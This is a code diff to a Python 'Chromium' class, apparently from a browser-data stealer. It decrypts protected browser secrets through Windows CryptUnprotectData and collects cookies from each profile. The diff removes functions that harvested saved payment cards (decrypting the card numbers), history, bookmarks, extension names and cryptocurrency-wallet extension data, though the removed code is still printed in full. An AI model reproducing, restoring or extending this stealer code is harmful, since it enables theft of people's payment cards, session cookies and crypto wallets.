@@ -19,7 +19,7 @@ class Chromium:
     """
 
     def __init__(
-        self, browser_name: str, browser_path: str, process_name: str, statuses: List
+            self, browser_name: str, browser_path: str, process_name: str, statuses: List
     ):
         self.__browser_name = browser_name
         self.__state_path = path.join(browser_path, "Local State")
@@ -86,7 +86,7 @@ class Chromium:
 
     @staticmethod
     def _crypt_unprotect_data(
-        encrypted_bytes: b64decode, entropy: bytes = b""
+            encrypted_bytes: b64decode, entropy: bytes = b""
     ) -> bytes:
         """
         Decrypts data previously encrypted using Windows CryptProtectData function.
@@ -101,18 +101,18 @@ class Chromium:
         blob = DataBlob()
 
         if windll.crypt32.CryptUnprotectData(
-            byref(
-                DataBlob(
-                    len(encrypted_bytes),
-                    c_buffer(encrypted_bytes, len(encrypted_bytes)),
-                )
-            ),
-            None,
-            byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
-            None,
-            None,
-            0x01,
-            byref(blob),
+                byref(
+                    DataBlob(
+                        len(encrypted_bytes),
+                        c_buffer(encrypted_bytes, len(encrypted_bytes)),
+                    )
+                ),
+                None,
+                byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
+                None,
+                None,
+                0x01,
+                byref(blob),
         ):
             buffer = c_buffer(int(blob.cbData))
             cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
@@ -287,194 +287,6 @@ class Chromium:
             "\n".join(row for row in temp),
         )
 
-    def _grab_cards(self, profile: str, file_path: str) -> None:
-        """
-        Collects browser cards.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - main_path [str]: Path of the file to be processed.
-        - alt_path [str]: Spare path of the file to be processed.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(file_path):
-            return
-
-        cursor, connection = self._get_db_connection(file_path)
-        cards_list = cursor.execute(self.__config.CardsSQL).fetchall()
-
-        cursor.close()
-        connection.close()
-
-        if not cards_list:
-            return
-
-        data = self.__config.CardsData
-        temp = [
-            data.format(
-                result[0],
-                self._decrypt(result[3], self.__master_key),
-                result[1],
-                result[2],
-            )
-            for result in cards_list
-        ]
-
-        self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} Cards.txt"),
-            "".join(item for item in set(temp)),
-        )
-
-    def _grab_history(self, profile: str, file_path: str) -> None:
-        """
-        Collects browser history.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - main_path [str]: Path of the file to be processed.
-        - alt_path [str]: Spare path of the file to be processed.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(file_path):
-            return
-
-        cursor, connection = self._get_db_connection(file_path)
-        results = cursor.execute(self.__config.HistorySQL).fetchall()
-        history_list = [
-            cursor.execute(self.__config.HistoryLinksSQL % int(item[0])).fetchone()
-            for item in results
-        ]
-
-        cursor.close()
-        connection.close()
-
-        if not results:
-            return
-
-        data = self.__config.HistoryData
-        temp = [
-            data.format(result[0], result[1], self._get_datetime(result[2]))
-            for result in history_list
-        ]
-
-        self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} History.txt"),
-            "".join(item for item in set(temp)),
-        )
-
-    def _grab_bookmarks(self, profile: str, file_path: str) -> None:
-        """
-        Collects browser bookmarks.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - main_path [str]: Path of the file to be processed.
-        - alt_path [str]: Spare path of the file to be processed.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(file_path):
-            return
-
-        file = self._get_file(file_path)
-        bookmarks_list = sum(
-            [self.__config.BookmarksRegex.findall(item) for item in file.split("{")], []
-        )
-
-        if not bookmarks_list:
-            return
-
-        data = self.__config.BookmarksData
-        temp = [data.format(result[0], result[1]) for result in bookmarks_list]
-
-        self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} Bookmarks.txt"),
-            "".join(item for item in set(temp)),
-        )
-
-    def _grab_extensions(self, profile: str, extensions_path: str) -> None:
-        """
-        Collects browser extensions.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - extensions_path [str]: Path to extensions directory.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(extensions_path):
-            return
-
-        extensions_list = []
-        extensions_dirs = listdir(extensions_path)
-
-        if not extensions_dirs:
-            return
-
-        for dirpath in extensions_dirs:
-            extension_dir = listdir(path.join(extensions_path, dirpath))
-
-            if len(extension_dir) == 0:
-                continue
-
-            extension_dir = extension_dir[-1]
-            manifest_path = path.join(
-                extensions_path, dirpath, extension_dir, "manifest.json"
-            )
-
-            with open(manifest_path, "r", encoding="utf-8") as file:
-                manifest = load(file)
-                name = manifest.get("name")
-
-                if name:
-                    extensions_list.append(name)
-
-            file.close()
-
-        self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} Extensions.txt"),
-            "\n".join(item for item in set(extensions_list)),
-        )
-
-    def _grab_wallets(self, profile: str, wallets: str) -> None:
-        """
-        Collects browser wallets.
-
-        Parameters:
-        - profile [str]: Browser profile.
-        - wallets [str]: Path to wallets directory.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(wallets):
-            return
-
-        for wallet in self.__config.WalletLogs:
-            for extension in wallet["folders"]:
-                try:
-                    extension_path = path.join(wallets, extension)
-
-                    if not path.exists(extension_path):
-                        continue
-
-                    self.__storage.add_from_disk(
-                        extension_path,
-                        path.join(
-                            "Wallets",
-                            rf'{self.__browser_name} {profile} {wallet["name"]}',
-                        ),
-                    )
-
-                except Exception as e:
-                    print(f"[{self.__browser_name}]: {repr(e)}")
-
     def _process_profile(self, profile: str) -> None:
         """
         Collects browser profile data.
@@ -496,34 +308,6 @@ class Chromium:
                 "method": self._grab_cookies,
                 "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
                 "status": True if Features.cookies in self.__statuses else False,
-            },
-            {
-                "method": self._grab_cards,
-                "arguments": [profile_name, path.join(profile, "Web Data")],
-                "status": True if Features.cards in self.__statuses else False,
-            },
-            {
-                "method": self._grab_history,
-                "arguments": [profile_name, path.join(profile, "History")],
-                "status": True if Features.history in self.__statuses else False,
-            },
-            {
-                "method": self._grab_bookmarks,
-                "arguments": [profile_name, path.join(profile, "Bookmarks")],
-                "status": True if Features.bookmarks in self.__statuses else False,
-            },
-            {
-                "method": self._grab_extensions,
-                "arguments": [profile_name, path.join(profile, "Extensions")],
-                "status": True if Features.bookmarks in self.__statuses else False,
-            },
-            {
-                "method": self._grab_wallets,
-                "arguments": [
-                    profile_name,
-                    path.join(profile, "Local Extension Settings"),
-                ],
-                "status": True if Features.wallets in self.__statuses else False,
             },
         ]
 
